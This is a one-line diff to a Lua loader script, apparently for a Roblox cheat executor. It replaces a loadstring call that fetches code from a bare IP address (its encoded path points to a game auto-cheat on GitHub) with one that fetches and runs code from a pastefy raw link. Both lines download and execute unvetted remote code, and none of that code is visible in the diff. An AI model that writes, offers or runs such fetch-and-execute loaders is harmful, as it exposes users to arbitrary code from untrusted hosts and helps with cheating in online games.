@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("http://109.71.240.235:3910/api/run/eyJpZCI6ImI3YTg3YjBmLTQxMzgtNGRhYy05NWJiLWQ3ODY4YzVjMjhmMyIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJjdXN0b20iLCJ1cmwiOiJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vTHVubkh1Ylg5OS9tbTJrdW5pYXV0by9yZWZzL2hlYWRzL21haW4vbHVhIn19"))()
+loadstring(game:HttpGet("https://pastefy.app/QtnqQJF2/raw"))()
